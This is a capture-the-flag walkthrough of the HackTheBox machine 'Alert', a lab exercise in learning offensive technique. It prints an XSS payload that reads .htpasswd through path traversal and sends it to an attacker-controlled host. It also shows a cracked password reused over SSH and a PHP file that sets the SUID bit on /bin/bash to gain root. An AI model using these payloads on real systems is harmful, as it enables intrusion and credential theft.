## Welcome everyone!



Today, we will explore *Alert*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Alert/Alert_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP     alert.htb`   to your local `/etc/hosts` file)





## Information Gathering


First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Alert/Alert_images/2.png)

We can identify two exposed services:

- **SSH** (OpenSSH 8.2p1 | 22)
- **HTTP** (Apache 2.4.41 (Ubuntu) | 80)

Let’s start inspecting the website hosted on port **80**:

![image](/HTB/Alert/Alert_images/3.png)

The website allows us to view some uploaded markdown. The expected file extension for upload is `.md` and there is no way to bypass it. Enumerating web resources with Gobuster reveals some `.php` endpoint:

![image](/HTB/Alert/Alert_images/4.png)

But we can’t do much with this. May this web domain be a decoy? Let’s use `ffuf` to perform **subdomain enumeration**:

![image](/HTB/Alert/Alert_images/5.png)

We successfully identified a valid subdomain: `statistics.alert.htb`. We may be able to retrieve interesting content there. But in order to access it, we need to add it to our local `/etc/hosts` file to resolve the hostname locally.

![image](/HTB/Alert/Alert_images/6.png)

We should now be able to access it from our web browser:

![image](/HTB/Alert/Alert_images/7.png)

We are greeted with an **HTTP Basic Auth**. Since we don’t have any credential, we may need to get back the the main website and inspect the file upload function. Uploading a file redirect us to a `/visualizer.php` endpoint that allows to render the uploaded file in an HTML format directly from the server’s response. Since we can inject HTML tags through the upload functionality, what happens if we upload we upload a `.md` file containing the following Blind XSS test code:

`<img src=x onerror="alert(1)">`

![image](/HTB/Alert/Alert_images/8.png)

Interesting, there is a reflected XSS vulnerability occurrring in the web application.





## Initial Access


Maybe we can leverage this vulnerability to retrieve the protected `.htpasswd` file content?

We will upload again the file with the following code:

`<script>`

`fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")`

`.then(response => response.text())`

`.then(data => {`

`fetch("http://<tun0 IP>:<port>/?file_content=" + encodeURIComponent(data));`

`});`

`</script>`

This will attempt to retrieve `.htpasswd` file content:

(ensure that you have set up a Python server with the port configured correctly to receive the HTTP response. Moreover, you should specify your own IP address.)

![image](/HTB/Alert/Alert_images/9.png)

Inspecting the `visualizer.php` endpoint source code, we can observe that a link has been created for our uploaded file. We could retrieve the .htpasswd file content if a bot or an administrator visits this link. There is a contact area that allows us to send a mail. We can attempt to send the link keeping the Python server open to see if we receive something:

![image](/HTB/Alert/Alert_images/10.png)

![image](/HTB/Alert/Alert_images/11.png)

Our link has successfully been accessed! We got an URL-encoded contents of the `.htpasswd` file retrieved through the administrator's request. Decoding it reveals something very interesting:

![image](/HTB/Alert/Alert_images/12.png)

There is a password hash for the **albert** user! We can paste it in a `hash.txt` file and pass it to John in order to perform offline password cracking:

![image](/HTB/Alert/Alert_images/13.png)

We successfully recovered the plaintext password for the **albert** user: `manchesterunited`.

We could attempt to authenticate through the HTTP Basic Auth panel protecting the statistics.alert.htb subdomain, but what if the password has been reused over **SSH**? This could allow us to obtain inital access on the target system. Let’s attempt to authenticate via SSH with the following credentials:

`albert:manchesterunited`

![image](/HTB/Alert/Alert_images/14.png)

It works! We successfully obtained initial access as the **albert** user by abusing a password reused. Listing the current user directory allow us to retrieve the first flag:

![image](/HTB/Alert/Alert_images/15.png)




## Privilege Escalation


We now need to escalate our current privileges to root in order to retrieve the final flag. It is a good practice to start enumerating privilege escalation vectors by running `sudo -l` to see whether the compromised user is able to run any command with **root privileges**:

![image](/HTB/Alert/Alert_images/16.png)

But here, it seems that we can’t do this.

Listing current processes with `ps aux` reveals that the **root** user is running internally a web application on port **8080**:

![image](/HTB/Alert/Alert_images/17.png)

Inspecting the `/opt/web-monitor/config` directory, we can observe that the folder is writable by root and users belonging under the `management` group. Fortunately, this is the case for `albert`!

![image](/HTB/Alert/Alert_images/18.png)

We can simply create a .php file containing the following code that we will access via `curl` in order to trigger it as **root** (because the website is running as **root**):

`<?php exec("chmod +s /bin/bash"); ?>`

The code sets the SUID bit on the `/bin/bash` executable. The SUID bit allows to run an executable with the privileges of its owner. Since the code will be executed as `root`, the file will receive a root SUID bit set on it.

Once the file has been created, we can trigger it using the following curl command:

`curl http://127.0.0.1:8080/config/malicious.php`

![image](/HTB/Alert/Alert_images/19.png)

The binary has successfully been modified! We can now execute the binary with the `-p` option to prevent the binary from dropping its root privileges at runtime:

![image](/HTB/Alert/Alert_images/20.png)

We successfully escalated our current privileges to **root**, granting us full access and control over the target machine. We can now navigate to the `/root` directory in order to retrieve the final flag:

![image](/HTB/Alert/Alert_images/21.png)

Challenge completed!

![image](/HTB/Alert/Alert_images/22.png)




## Conclusion

This machine demonstrated how several seemingly low-impact issues can be chained together into a full system compromise. The attack started with a Markdown rendering vulnerability leading to a Blind XSS, which was leveraged to retrieve sensitive credentials from a protected resource. After cracking the recovered password hash and abusing password reuse, SSH access was obtained as a low-privileged user.

Privilege escalation was then achieved through the discovery of an internally exposed web application running with elevated privileges and a writable configuration directory, ultimately resulting in full root access.

Overall, **Alert** is an excellent beginner-friendly machine that highlights the importance of secure input sanitization, protecting sensitive files, avoiding password reuse, and enforcing the principle of least privilege on internal services. It provides an excellent introduction to chaining multiple vulnerabilities together to achieve a complete system compromise.

**Thank you for reading!**
